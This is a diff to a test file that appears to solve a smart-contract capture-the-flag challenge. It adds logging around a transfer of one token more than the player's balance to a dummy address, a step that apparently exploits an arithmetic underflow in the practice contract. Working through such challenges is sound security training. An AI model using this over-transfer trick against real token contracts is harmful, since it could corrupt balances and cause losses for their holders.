@@ -26,8 +26,10 @@ it("solves the challenge", async function () {
   let cheatAddr: string = `0xdeadbeef00000000000000000000000000000001`
   let addr: string = await eoa.getAddress();
   let balance: BigNumber = await challenge.balanceOf(addr);
+  console.log("Balance is: ", balance);
+  console.log("Transfer 1 more than balance to rando");
   await challenge.transfer(cheatAddr, balance.add(BigNumber.from(1n)));
-  console.log("balance after transfer: ", await challenge.balanceOf(addr));
+  console.log("Balance after transfer: ", await challenge.balanceOf(addr));
 });
 
 after(async () => {
